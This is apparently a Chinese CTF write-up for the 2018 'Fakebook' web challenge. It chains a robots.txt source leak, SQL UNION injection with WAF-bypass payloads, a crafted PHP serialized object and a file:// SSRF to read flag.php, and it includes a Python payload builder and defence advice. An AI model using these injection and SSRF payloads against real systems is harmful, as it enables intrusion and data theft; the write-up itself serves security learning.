# [网鼎杯 2018]Fakebook

## 题目信息

- **URL**: `http://43f7c8e3-80d4-4646-a309-f4c9abcc7012.node5.buuoj.cn:81/`
- **类型**: WEB
- **考点**: SQL 注入（UNION 注入） + SSRF（file:// 协议读文件） + PHP 反序列化 + WAF 绕过

## 信息收集

### 首页

访问首页，页面标题为 "Fakebook"，是一个仿 Facebook 的社交平台。功能点：

- `login.php` — 登录页面
- `join.php` — 注册页面
- 首页展示用户列表（username, age, blog）

HTTP 响应头关键信息：

```
Server: openresty
X-Powered-By: PHP/5.6.40
Set-Cookie: PHPSESSID=...
```

### robots.txt 泄露源码

访问 `/robots.txt`：

```
User-agent: *
Disallow: /user.php.bak
```

下载 `/user.php.bak` 获取核心类源码：

```php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);
        return $output;
    }

    public function getBlogContents()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i", $blog);
    }
}
```

### view.php 探测

**不带参数直接访问 `/view.php`**，由于缺少 `no` 参数，SQL 语法直接报错，暴露关键信息：

```
Notice: Undefined index: no in /var/www/html/view.php on line 24
You have an error in your SQL syntax... near '' at line 1
```

确认：
- 数据库为 **MariaDB**
- 路径 `/var/www/html/view.php`
- `no` 参数存在 **SQL 注入**（直接拼接到查询，无过滤）

注意：这里报错的触发条件是**不加 `no` 参数**，而非 `view.php?no=1`。`view.php?no=1` 在有合法数据时返回正常页面。

## 漏洞分析

### 1. SQL 注入

`view.php` 第 24 行获取 `$_GET['no']` 后直接拼接到 SQL 查询中，无任何过滤：

```sql
SELECT * FROM users WHERE no = $no
```

数据库表结构推断为 4 列：`id`, `username`, `passwd`, `data`
- `data` 列存储序列化的 `UserInfo` 对象
- `view.php` 第 31 行对 `data` 列执行 `unserialize()` 反序列化
- 之后访问 `$user->name`、`$user->age`、`$user->blog` 属性
- 最终调用 `$user->getBlogContents()` 抓取 blog URL 内容

### 2. SSRF（Server-Side Request Forgery）

`UserInfo::get($url)` 方法使用 `curl_exec()` 请求任意 URL，**未限制协议类型**。虽然注册时 `isValidBlog()` 验证了 URL 必须是 `http(s)://` 域名格式，但通过 SQL 注入 UNION 构造的数据不经过此验证，可以直接使用 `file://` 协议读取本地文件。

### 3. WAF 绕过

题目存在 WAF 过滤 `union` 关键字。测试发现：

| Payload | 结果 |
|---------|------|
| `union select` | 拦截（no hack ~_~） |
| `Union Select` | 拦截 |
| `union/**/select` | ✅ 绕过 |
| `union all select` | ✅ 绕过 |
| `/*!union*/ select` | ✅ 绕过 |

同时 WAF 检测 `unhex()` 函数和 `0x` 十六进制前缀，但 `CONCAT(CHAR(...))` 可以绕过。

### 4. PHP 反序列化注入

通过 UNION 注入在第 4 列（data 列）插入自定义的序列化 `UserInfo` 对象，控制 `blog` 属性指向目标文件。PHP 的 `unserialize()` 会忠实地还原对象，随后 `getBlogContents()` 触发 SSRF。

## 漏洞利用

### Step 1: 确定列数

```
GET /view.php?no=1 order by 4  → 正常返回
GET /view.php?no=1 order by 5  → SQL 错误
```

确认列数为 **4**。

### Step 2: 构造序列化 Payload

目标：让 blog 属性指向 `file:///var/www/html/flag.php`

```php
$user = new UserInfo("hacker", 25, "file:///var/www/html/flag.php");
echo serialize($user);
// 输出: O:8:"UserInfo":3:{s:4:"name";s:6:"hacker";s:3:"age";i:25;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

### Step 3: 构造 SQL 注入 Payload

由于序列化字符串含双引号，直接放入 SQL 单引号字符串会被转义。使用 `CONCAT(CHAR(...))` 逐字符构造：

```sql
-1 union/**/select 1,'hacker',3,CONCAT(CHAR(79,58,56,...))
```

Python 构造代码：

```python
import urllib.request, urllib.parse

serialized = 'O:8:"UserInfo":3:{s:4:"name";s:6:"hacker";s:3:"age";i:25;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'

# 分组构造 CHAR()
chunks = []
for i in range(0, len(serialized), 30):
    chunk = serialized[i:i+30]
    char_nums = ','.join(str(ord(c)) for c in chunk)
    chunks.append(f"CHAR({char_nums})")

concat_str = f"CONCAT({','.join(chunks)})"
payload = f"-1 union/**/select 1,'hacker',3,{concat_str}"

url = f"http://target/view.php?no={urllib.parse.quote(payload)}"
```

### Step 4: 发送请求，获取 Flag

服务器返回的 HTML 中包含：

```html
<iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tmMWU5ZDlmOS04YmQ4LTQ5YTMtOWZmOC0xYzlkOGZjMzNiYTl9IjsNCmV4aXQoMCk7DQo='>
```

base64 解码得到 `flag.php` 源码：

```php
<?php

$flag = "flag{f1e9d9f9-8bd8-49a3-9ff8-1c9d8fc33ba9}";
exit(0);
```

## 获取 Flag

```
flag{f1e9d9f9-8bd8-49a3-9ff8-1c9d8fc33ba9}
```

## 攻击链路总结

```
robots.txt → user.php.bak 源码泄露
    ↓
分析 UserInfo 类：curl_exec 无协议限制 → SSRF
    ↓
view.php?no= SQL 注入 → order by 测列数 = 4
    ↓
union/**/select 绕过 WAF
    ↓
第4列注入序列化 UserInfo 对象（CONCAT(CHAR())）
    ↓
blog = file:///var/www/html/flag.php
    ↓
getBlogContents() → curl_exec(file://) → SSRF 读取 flag
```

## 知识点总结

- **信息泄露**：`robots.txt` 暴露备份文件路径 → 下载 `.bak` 源码
- **SQL 注入**：数字型注入，`order by` 测列数，`union select` 联合查询
- **WAF 绕过**：`union/**/select` 内联注释绕过关键字检测
- **PHP 反序列化**：理解 `serialize()`/`unserialize()` 格式，手工构造序列化数据
- **SSRF**：`curl_exec()` 支持 `file://` 协议，通过控制输入参数读取本地文件
- **PHP 安全配置**：`magic_quotes_gpc` 对特殊字符的转义影响

### 使用工具

- Python `urllib` — HTTP 请求与 Payload 构造
- 手工分析 — 源码审计、WAF 绕过探测
- Base64 解码 — 提取 SSRF 返回的文件内容

### 防御建议

1. SQL 查询使用参数化（Prepared Statements），杜绝 SQL 注入
2. curl 请求前验证 URL 协议，禁用 `file://` 等危险协议
3. 不要将源码备份文件（`.bak`）放在 Web 可访问目录
4. 关闭 PHP 错误回显，避免泄露服务器路径和数据库类型
5. 反序列化前验证数据完整性，或使用 JSON 替代 PHP 序列化
